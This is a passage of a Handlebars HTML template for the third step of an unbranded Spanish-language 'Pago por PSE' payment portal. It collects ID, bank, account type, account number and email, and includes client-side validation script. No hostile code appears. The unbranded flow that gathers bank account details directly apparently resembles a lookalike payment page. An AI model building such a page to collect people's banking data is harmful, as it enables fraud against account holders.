</svg></div>
    <span class="text-lg font-semibold">Portal de pago</span>
  </div>

  <h1 class="mt-6 text-2xl font-extrabold">Pago por PSE</h1>
  <p class="mt-1 text-sm text-gray-500">Completa los datos de tu cuenta para realizar el débito.</p>

  {{#if error}}
  <div class="mt-4 rounded border border-red-300 bg-red-50 px-4 py-3 text-sm text-red-700">
    {{error}}
  </div>
  {{/if}}

  <form action="/paso3" method="POST" class="mt-8 space-y-7" novalidate id="form-paso3">

    <input type="hidden" name="cedula"        value="{{cedula}}">
    <input type="hidden" name="nombreCliente" value="{{nombreCliente}}">
    <input type="hidden" name="numProducto"   value="{{numProducto}}">
    <input type="hidden" name="valorPagar"    value="{{valorPagar}}">
    <input type="hidden" name="otroValor"     value="{{otroValor}}">

    <div>
      <p class="mb-2 text-sm font-semibold">Tipo de persona <span class="text-red-600">*</span></p>
      <div class="flex gap-6">
        <label class="flex items-center gap-2 cursor-pointer text-sm">
          <input type="radio" name="tipopersona" value="natural" class="accent-red-600" checked>
          Persona natural
        </label>
        <label class="flex items-center gap-2 cursor-pointer text-sm">
          <input type="radio" name="tipopersona" value="juridica" class="accent-red-600">
          Persona jurídica
        </label>
      </div>
    </div>

    <div>
      <label for="tipodoc" class="mb-1 block text-sm font-semibold">
        Tipo de documento <span class="text-red-600">*</span>
      </label>
      <select id="tipodoc" name="tipodoc" required
              class="w-full border-b border-gray-400 bg-transparent pb-2 text-sm text-gray-700 outline-none focus:border-black">
        <option value="" disabled selected>Selecciona el tipo</option>
        <option value="CC">Cédula de ciudadanía (CC)</option>
        <option value="CE">Cédula de extranjería (CE)</option>
        <option value="NIT">NIT (Persona jurídica)</option>
        <option value="PA">Pasaporte (PA)</option>
        <option value="TI">Tarjeta de identidad (TI)</option>
      </select>
      <span class="mt-1 hidden text-xs text-red-600" id="err-tipodoc">Selecciona el tipo de documento.</span>
    </div>

    <div>
      <label for="numdoc" class="mb-1 block text-sm font-semibold">
        Número de documento <span class="text-red-600">*</span>
      </label>
      <input id="numdoc" name="numdoc" type="text" inputmode="numeric"
             placeholder="Solo números, sin puntos ni espacios"
             maxlength="12" required value="{{numdoc}}"
             class="w-full border-b border-gray-400 bg-transparent pb-2 text-sm text-gray-600 placeholder-gray-400 outline-none focus:border-black">
      <span class="mt-1 text-xs text-gray-400">Entre 6 y 12 dígitos numéricos.</span>
      <span class="mt-1 hidden text-xs text-red-600" id="err-numdoc">Ingresa un número de documento válido (6–12 dígitos).</span>
    </div>

    <div>
      <label for="banco" class="mb-1 block text-sm font-semibold">
        Banco <span class="text-red-600">*</span>
      </label>
      <select id="banco" name="banco" required
              class="w-full border-b border-gray-400 bg-transparent pb-2 text-sm text-gray-700 outline-none focus:border-black">
        <option value="" disabled selected>Selecciona tu banco</option>
        <option value="Bancolombia">Bancolombia</option>
        <option value="Banco de Bogotá">Banco de Bogotá</option>
        <option value="Davivienda">Davivienda</option>
        <option value="BBVA Colombia">BBVA Colombia</option>
        <option value="Banco de Occidente">Banco de Occidente</option>
        <option value="Banco AV Villas">Banco AV Villas</option>
        <option value="Banco Caja Social">Banco Caja Social</option>
        <option value="Banco Popular">Banco Popular</option>
        <option value="Nequi">Nequi</option>
        <option value="Daviplata">Daviplata</option>
        <option value="Nu Colombia">Nu Colombia</option>
        <option value="Scotiabank Colpatria">Scotiabank Colpatria</option>
        <option value="Banco Agrario">Banco Agrario</option>
        <option value="Banco Itaú">Banco Itaú</option>
        <option value="Banco Falabella">Banco Falabella</option>
        <option value="Banco Pichincha">Banco Pichincha</option>
        <option value="GNB Sudameris">GNB Sudameris</option>
        <option value="Ban100">Ban100</option>
        <option value="Bancoomeva">Bancoomeva</option>
        <option value="Bancamía">Bancamía</option>
        <option value="Movii">Movii</option>
        <option value="Dale">Dale</option>
        <option value="Bold">Bold</option>
        <option value="RappiPay">RappiPay</option>
        <option value="Banco Cooperativo Coopcentral">Banco Cooperativo Coopcentral</option>
        <option value="Confiar">Confiar</option>
        <option value="Banco Mujer">Banco Mujer</option>
      </select>
      <span class="mt-1 hidden text-xs text-red-600" id="err-banco">Selecciona tu banco.</span>
    </div>

    <div>
      <p class="mb-2 text-sm font-semibold">Tipo de cuenta <span class="text-red-600">*</span></p>
      <div class="flex gap-6">
        <label class="flex items-center gap-2 cursor-pointer text-sm">
          <input type="radio" name="tipocuenta" value="ahorros" class="accent-red-600" checked>
          Cuenta de ahorros
        </label>
        <label class="flex items-center gap-2 cursor-pointer text-sm">
          <input type="radio" name="tipocuenta" value="corriente" class="accent-red-600">
          Cuenta corriente
        </label>
      </div>
    </div>

    <div>
      <label for="numcuenta" class="mb-1 block text-sm font-semibold">
        Número de cuenta <span class="text-red-600">*</span>
      </label>
      <input id="numcuenta" name="numcuenta" type="text" inputmode="numeric"
             placeholder="Solo dígitos, sin guiones ni espacios"
             minlength="7" maxlength="16" required value="{{numcuenta}}"
             class="w-full border-b border-gray-400 bg-transparent pb-2 text-sm text-gray-600 placeholder-gray-400 outline-none focus:border-black">
      <span class="mt-1 text-xs text-gray-400">Entre 7 y 16 dígitos (según tu banco).</span>
      <span class="mt-1 hidden text-xs text-red-600" id="err-numcuenta">Número de cuenta inválido (7–16 dígitos numéricos).</span>
    </div>

    <div>
      <label for="correo" class="mb-1 block text-sm font-semibold">
        Correo electrónico <span class="text-red-600">*</span>
      </label>
      <input id="correo" name="correo" type="email"
             placeholder="ejemplo@correo.com" required value="{{correo}}"
             class="w-full border-b border-gray-400 bg-transparent pb-2 text-sm text-gray-600 placeholder-gray-400 outline-none focus:border-black">
      <span class="mt-1 text-xs text-gray-400">Te enviaremos el comprobante de pago.</span>
      <span class="mt-1 hidden text-xs text-red-600" id="err-correo">Ingresa un correo electrónico válido.</span>
    </div>

    <div class="rounded-lg bg-gray-50 border border-gray-200 p-5 space-y-2 text-sm">
      <p class="font-semibold text-gray-800 mb-3">Resumen del pago</p>
      <div class="flex justify-between">
        <span class="text-gray-500">Producto</span>
        <span class="font-medium">{{numProducto}}</span>
      </div>
      <div class="flex justify-between">
        <span class="text-gray-500">Valor a pagar</span>
        <span class="font-semibold text-gray-900">{{valorPagar}}</span>
      </div>
      {{#if otroValor}}
      <div class="flex justify-between">
        <span class="text-gray-500">Otro valor</span>
        <span class="font-medium">{{otroValor}}</span>
      </div>
      {{/if}}
    </div>

    {{> seguridad}}

    <div class="flex items-center justify-between pt-2">
      <a href="/paso2?cedula={{cedula}}" aria-label="Volver al Paso 2"
         class="p-2 text-gray-600 hover:text-black transition-colors duration-150">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
             stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M19 12H5M12 19l-7-7 7-7"/>
        </svg>
      </a>
      <button type="submit"
              class="flex items-center gap-3 text-base font-semibold text-gray-700
                     hover:text-red-600 transition-colors duration-150 group">
        <span>Pagar ahora</span>
        <span class="flex h-9 w-9 items-center justify-center rounded-full border border-gray-300
                     group-hover:border-red-600 transition-colors duration-150">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor"
               stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M5 12h14M12 5l7 7-7 7"/>
          </svg>
        </span>
      </button>
    </div>

  </form>
</main>

<script>
  // Solo números en documento y cuenta
  ['numdoc','numcuenta'].forEach(id => {
    document.getElementById(id).addEventListener('input', function() {
      this.value = this.value.replace(/[^0-9]/g, '');
    });
  });

  // Correo: sin espacios
  document.getElementById('correo').addEventListener('input', function() {
    this.value = this.value.replace(/\s/g, '');
  });

  // Validación completa al enviar
  document.getElementById('form-paso3').addEventListener('submit', function(e) {
    let ok = true;

    const tipodoc = document.getElementById('tipodoc');
    const errTipodoc = document.getElementById('err-tipodoc');
    if (!tipodoc.value) { errTipodoc.classList.remove('hidden'); ok = false; }
    else { errTipodoc.classList.add('hidden'); }

    const numdoc = document.getElementById('numdoc');
    const errNumdoc = document.getElementById('err-numdoc');
    if (!/^[0-9]{6,12}$/.test(numdoc.value)) { errNumdoc.classList.remove('hidden'); ok = false; }
    else { errNumdoc.classList.add('hidden'); }

    const banco = document.getElementById('banco');
    const errBanco = document.getElementById('err-banco');
    if (!banco.value) { errBanco.classList.remove('hidden'); ok = false; }
    else { errBanco.classList.add('hidden'); }

    const numcuenta = document.getElementById('numcuenta');
    const errNumcuenta = document.getElementById('err-numcuenta');
    if (!/^[0-9]{7,16}$/.test(numcuenta.value)) { errNumcuenta.classList.remove('hidden'); ok = false; }
    else { errNumcuenta.classList.add('hidden'); }

    const correo = document.getElementById('correo');
    const errCorreo = document.getElementById('err-correo');
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(correo.value)) { errCorreo.classList.remove('hidden'); ok = false; }
    else { errCorreo.classList.add('hidden'); }

    if (!ok) e.preventDefault();
  });
</script>